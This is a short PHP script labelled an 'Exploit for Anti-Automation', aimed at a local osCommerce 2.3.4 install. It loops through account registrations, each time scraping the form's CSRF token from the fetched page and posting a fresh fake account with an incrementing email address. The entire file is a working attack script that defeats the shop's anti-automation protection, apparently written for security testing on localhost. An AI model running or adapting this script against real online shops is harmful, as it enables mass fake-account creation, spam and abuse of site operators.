<?php



// Initiating the real requests.

   // Insert the number of automated registered users here.
   $numregistrations=10;
   

   for($i=0;$i<$numregistrations;$i++) {


// NOTE: Reinstall php-curl.	

	// Exploit for Anti-Automation in Gallery.

	// Login into the site.

// Local copy of the site.
   $url = 'http://localhost/oscommerce-2.3.4/catalog/create_account.php';


// Local Copy.
   	$firstname = 'Guybrush';
	$gender = 'm';
	$lastname = 'Threepwood';
	$dob = '12/25/1996';

	$base_email_address = 'hacker';
	$password= '122596';
	$confirmation = '122596';

	$street_address = '303030';
	$postcode = '303030';
	$city = 'AAA';

	$state = 'AA';
	
	$country = '1';

	$telephone = '122-596-596';
	

	$action='process';

	$post_data= array();	                    

	$ch = curl_init($url);

	$postargs = http_build_query($post_data);

	curl_setopt($ch, CURLOPT_POST,true);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$postargs);


	$cookiefile = 'cookies.txt';
	curl_setopt($ch, CURLOPT_COOKIEJAR,realpath($cookiefile));


// New to OSCOMMERCE
//	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);	
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,false);	


	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);	

	curl_setopt($ch,CURLOPT_HEADER,1);

	// OSWALDO: New to OSCOMMERCE
	
	ob_start();
	
	$output = curl_exec($ch);
	
//	print "Hello World!\n";



       $retrieved_html = ob_get_contents();
       
       $formid = stristr($retrieved_html,"formid");
       
       $formid = substr($formid,15,32);       
       
//       print "Retrieved = ".$formid;

  
   // Generate new e-mail address:

   $email_address = $base_email_address.$i.'@gmail.com';

	$post_data = array(
		   'email_address' => $email_address,
		   'password' => $password,
		   'action' => $action,
		   'formid' => $formid,
		   'autologin' => '1',


		   'firstname' => $firstname = 'Oswaldo',
		   'gender' => $gender,
		   'lastname' => $lastname,
		   'dob' => $dob,
		   'confirmation' => $confirmation,
		   
		   'street_address' => $street_address,
		   'postcode' => $postcode,
		   'city' => $city,
		   'state' => $state,
		   'country' => $country,
		   'telephone' => $telephone
	);


	$postargs = http_build_query($post_data);

	curl_setopt($ch, CURLOPT_POST,true);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$postargs);
  
	$output = curl_exec($ch);   

	curl_close($ch);
	}

       // This crashes for some reason.
  //     ob_end_clean();


?>